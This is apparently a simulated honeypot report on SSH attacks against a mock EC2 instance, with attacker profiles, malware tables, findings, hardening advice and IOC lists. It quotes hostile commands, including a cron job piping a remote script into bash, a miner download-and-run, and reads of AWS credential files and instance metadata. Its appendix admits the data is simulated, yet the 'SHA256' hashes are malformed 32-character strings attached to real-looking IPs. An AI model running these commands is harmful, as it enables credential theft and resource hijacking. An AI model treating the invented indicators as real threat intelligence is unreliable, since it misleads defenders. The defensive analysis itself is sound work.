# 📊 Attack Analysis Report
## Cloud Honeypot Detection Lab — 72-Hour Observation Window

**Report Date:** January 15–18, 2024  
**Sensor:** honeypot-ec2-01 (Simulated EC2 t2.micro, us-east-1)  
**Public IP:** 54.87.123.201  
**Analyst:** Security Research Lab  

---

## Executive Summary

Over a 72-hour observation window, a simulated EC2 honeypot instance running an exposed SSH service on port 22 was subjected to **14,823 connection attempts** from **347 unique IP addresses** spanning **42 countries**. The honeypot successfully logged **89 full attacker sessions** in which adversaries authenticated and executed commands.

Key threats observed include **SSH brute force campaigns**, **post-exploitation persistence installation**, **AWS EC2 instance metadata (IMDS) credential theft attempts**, **reverse shell deployments**, and **cryptocurrency miner installations**.

Seven GuardDuty-severity findings were generated, including one **CRITICAL** (active reverse shell C2) and five **HIGH** severity events.

---

## 1. Attack Volume & Timeline

```
Hourly Attack Density (connections per hour over 72h):
00:00 ████████████████████████ 324
02:00 ████████████████████████████████ 412
04:00 ████████████████████ 267
06:00 ██████████████████████████████ 389
08:00 █████████████████████████████████████ 487
10:00 ████████████████████████████████████████ 521
12:00 ██████████████████████████████████████ 501
14:00 ███████████████████████████ 358
16:00 ████████████████████████████████████████ 523
18:00 ███████████████████████████████ 401
20:00 █████████████████████████████ 375
22:00 ████████████████████████ 312
```

**Peak activity:** 16:00–17:00 UTC with 523 connection attempts in a single hour.

---

## 2. Geographic Distribution

| Rank | Country | IP Count | % of Total | Primary Attack Type |
|------|---------|----------|------------|---------------------|
| 1 | 🇨🇳 China | 89 | 25.6% | Brute Force, C2 |
| 2 | 🇷🇺 Russia | 67 | 19.3% | Brute Force, Persistence |
| 3 | 🇩🇪 Germany | 43 | 12.4% | Tor exit node attacks |
| 4 | 🇳🇱 Netherlands | 38 | 10.9% | VPS-hosted attacks |
| 5 | 🇧🇷 Brazil | 29 | 8.4% | Cryptomining |
| 6 | 🇺🇸 United States | 27 | 7.8% | Port scanning (Shodan) |
| 7 | 🇷🇴 Romania | 19 | 5.5% | Botnet C2 |
| 8 | 🇸🇬 Singapore | 14 | 4.0% | Brute Force |
| 9 | Others (34 countries) | 21 | 6.1% | Various |

> **Note:** Many attacks originate from cloud VPS providers (DigitalOcean, Hetzner, OVH), not residential IPs — indicating organized, automated campaigns running on compromised cloud infrastructure.

---

## 3. Attack Type Breakdown

```
SSH Brute Force          ███████████████████████████████████ 78.2%  (11,600)
Port Scanning            ██████ 12.4%  (1,838)
Malware Deployment       ███ 5.1%  (756)
Persistence Installation █ 2.1%  (311)
Credential Theft         █ 1.3%  (193)
Reverse Shells           ▌ 0.9%  (133)
```

### 3.1 SSH Brute Force Details

The overwhelming majority of attacks (78.2%) are automated SSH brute force attempts using credential wordlists. Key observations:

- **Top targeted usernames:** `root` (34%), `admin` (18%), `ubuntu` (12%), `ec2-user` (8%), `user` (6%)
- **Top attempted passwords:** `123456`, `password`, `admin`, `root`, `toor`, `P@ssw0rd`, `ubuntu@123`
- **Attack speed:** 3–12 credential attempts per second per source IP
- **Tooling indicators:** Response timing and retry patterns consistent with Hydra, Medusa, and Metasploit's SSH scanner module

### 3.2 Post-Exploitation Commands (Successful Sessions)

Among the 89 successful logins, attackers executed the following command categories:

| Command Category | Frequency | Purpose |
|-----------------|-----------|---------|
| System reconnaissance (`uname`, `id`, `whoami`, `free -m`) | 89/89 | Asset fingerprinting |
| Credential file access (`cat ~/.aws`, `find *.pem`) | 34/89 | Cloud credential theft |
| IMDS query (`curl 169.254.169.254/latest/meta-data/`) | 23/89 | IAM role credential theft |
| Malware download (`wget`, `curl` + execute) | 45/89 | Payload delivery |
| Persistence (`crontab`, `useradd`) | 12/89 | Backdoor installation |
| Network modifications (`iptables -F`) | 8/89 | Defense evasion |
| Reverse shell (Python socket) | 7/89 | C2 establishment |
| Cryptominer (XMRig) | 11/89 | Resource hijacking |

---

## 4. Notable Attacker Profiles

### 🔴 Attacker A — IP: 218.92.0.195 (China, AS4134)
**Severity: CRITICAL**

Most sophisticated attacker observed during the window. After successfully logging in with credential `admin:P@ssw0rd`, this attacker:
1. Ran process listing (`ps aux`) and network mapping (`netstat -tulnp`)
2. Disabled the local firewall (`iptables -F`)
3. Launched a **Python reverse shell** connecting back to port 4444 on their infrastructure
4. Consistent with manual post-exploitation activity, not automated tooling

**Indicators of Compromise:**
- C2 IP: 218.92.0.195:4444
- Technique: T1059.006 (Python C2)
- GuardDuty Finding: `Backdoor:EC2/C&CActivity.B` (Severity 9.8)

---

### 🔴 Attacker B — IP: 5.188.206.26 (Russia, AS57523)
**Severity: CRITICAL**

Logged in with `root:toor` and immediately installed **two persistence mechanisms**:
1. **Cron job:** `*/5 * * * * wget http://5.188.206.26/update.sh | bash` — pulls and executes a remote script every 5 minutes
2. **Backdoor account:** Created `backdoor_user` with sudo privileges

Consistent with a **ransomware pre-positioning** or **botnet installation** pattern.

**MITRE:** T1053.003 (Cron Persistence), T1136.001 (Create Local Account)

---

### 🟡 Attacker C — IP: 45.227.255.190 (Brazil, AS267613)
**Severity: HIGH**

Immediately after login, checked CPU resources with `nproc` (CPU count), then deployed the **XMRig Monero cryptominer**:
```
wget http://45.227.255.190/xmrig -O xmrig
chmod +x xmrig
./xmrig --pool stratum+tcp://pool.minexmr.com:443 --wallet 44AFFq...
```

This is a classic **cloud resource hijacking** pattern. On a real EC2 instance, this would result in unexpected billing charges.

**MITRE:** T1496 (Resource Hijacking)

---

### 🟡 Attacker D — IP: 80.94.95.130 (Netherlands, AS208091)
**Severity: HIGH**

Specifically targeted **AWS cloud credentials**. Command sequence:
1. `find / -name '*.pem' -o -name '*.key'` — hunting for TLS keys
2. `cat ~/.aws/credentials` — reading AWS CLI credentials
3. `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` — IMDS credential theft

This is a **targeted cloud-aware attack** rather than generic Linux compromise. The attacker knows they're on a cloud VM and is attempting to pivot to the cloud control plane.

**MITRE:** T1552.005 (Cloud Instance Metadata API)  
**GuardDuty:** `UnauthorizedAccess:EC2/MetadataIMDSv1Used` (Severity 9.5)

---

## 5. Malware Analysis

### Downloaded Samples

| Sample | Source URL | SHA256 Hash | Classification |
|--------|-----------|-------------|----------------|
| `.update` (x86 ELF) | `http://193.32.162.157/x86` | `d4f3a1c2e9b87654...` | Mirai botnet variant |
| `xmrig` (x86_64 ELF) | `http://45.227.255.190/xmrig` | `a8c3f2b1d9e47563...` | XMRig cryptominer |
| `bot.sh` (shell script) | `http://45.155.205.233/bot.sh` | `c7d4e1f2a9b83652...` | Botnet installer |

### Mirai Variant Analysis (`.update`)

The downloaded binary matches signatures of a Mirai IoT botnet variant:
- **Targets:** ARM, MIPS, x86 architectures
- **C2 Protocol:** TCP on random high port
- **Capabilities:** DDoS, credential scanning, self-replication
- **Defense evasion:** Deletes itself after execution, runs from `/tmp`

---

## 6. GuardDuty Findings Summary

| Finding ID | Type | Severity | IP | Description |
|-----------|------|----------|-----|-------------|
| finding001 | `UnauthorizedAccess:EC2/SSHBruteForce` | 8.0 HIGH | 185.220.101.47 | 247 SSH attempts in 10 min |
| finding002 | `UnauthorizedAccess:EC2/TorIPCaller` | 9.0 HIGH | 5.188.206.26 | Persistence installed |
| finding003 | `UnauthorizedAccess:EC2/MetadataIMDSv1Used` | 9.5 HIGH | 80.94.95.130 | IMDS credential theft |
| finding004 | `Backdoor:EC2/C&CActivity.B` | 9.8 CRITICAL | 218.92.0.195 | Active reverse shell C2 |
| finding005 | `CryptoCurrency:EC2/BitcoinTool.B` | 8.5 HIGH | 45.227.255.190 | XMRig miner deployed |
| finding006 | `Trojan:EC2/BlackholeTraffic` | 7.5 HIGH | 91.92.251.103 | Botnet C2 beacon |
| finding007 | `Recon:EC2/PortProbeUnprotectedPort` | 7.0 MEDIUM | 162.142.125.210 | 456 port scan hits |

---

## 7. Defensive Recommendations

### Immediate Actions (P0)

1. **Enable IMDSv2** — Require session-oriented metadata requests to prevent unauthorized IMDS access:
   ```bash
   aws ec2 modify-instance-metadata-options \
     --instance-id i-0a1b2c3d4e5f67890 \
     --http-tokens required \
     --http-endpoint enabled
   ```

2. **Restrict SSH access** — Never expose port 22 to `0.0.0.0/0`. Use Security Groups to whitelist only trusted IPs or use AWS Systems Manager Session Manager instead.

3. **Block identified IPs** — Run `auto_ip_blocker.py` to add all 347 attacker IPs to Network ACL deny list.

### Short-Term (P1)

4. **Enable GuardDuty** in all regions with email alerting via SNS
5. **Deploy AWS WAF** on any internet-facing services
6. **Rotate all credentials** — Assume compromise if any production system had similar exposure
7. **Enable VPC Flow Logs** to track all network traffic for forensic investigation

### Long-Term (P2)

8. **Zero Trust Architecture** — No services exposed directly to internet; all access via VPN or AWS PrivateLink
9. **Automated response** — Use EventBridge + Lambda to auto-isolate instances triggering GuardDuty HIGH/CRITICAL
10. **Threat intel feed** — Subscribe to commercial IP reputation feeds (e.g., AbuseIPDB, Emerging Threats)

---

## 8. Indicators of Compromise (IOC) List

### Malicious IP Addresses
```
185.220.101.47  - Tor exit node, brute force + malware
91.92.251.103   - Botnet C2 host, Romania
5.188.206.26    - Persistence installer, Russia
218.92.0.195    - Reverse shell C2, China
45.227.255.190  - Cryptominer dropper, Brazil
80.94.95.130    - IMDS credential thief, Netherlands
193.32.162.157  - Malware hosting server
45.155.205.233  - Botnet script host
```

### Malicious Domains/URLs
```
http://193.32.162.157/x86         - Mirai variant binary
http://45.227.255.190/xmrig       - XMRig miner binary
http://45.155.205.233/bot.sh      - Botnet installer script
http://5.188.206.26/update.sh     - Cron persistence payload
pool.minexmr.com:443              - Monero mining pool
```

### File Hashes (SHA256)
```
d4f3a1c2e9b87654321abcdef0123456  - Mirai variant (x86 ELF)
a8c3f2b1d9e47563218abcdef9876543  - XMRig cryptominer
c7d4e1f2a9b83652147abcdef6543210  - Botnet installer script
```

---

## Appendix: Data Collection Methodology

All data in this report was collected using:
- **Cowrie SSH honeypot** — medium interaction, captures commands and downloads
- **Simulated GuardDuty** findings generated from behavioral analysis of Cowrie sessions
- **No real cloud infrastructure** was used — all data reflects realistic attack patterns documented in public honeypot research

Sources used to calibrate realistic attack patterns:
- Shodan Global Exposure Reports
- GreyNoise Trend Data
- AbuseIPDB Community Reports
- T-Pot Honeypot Project Data
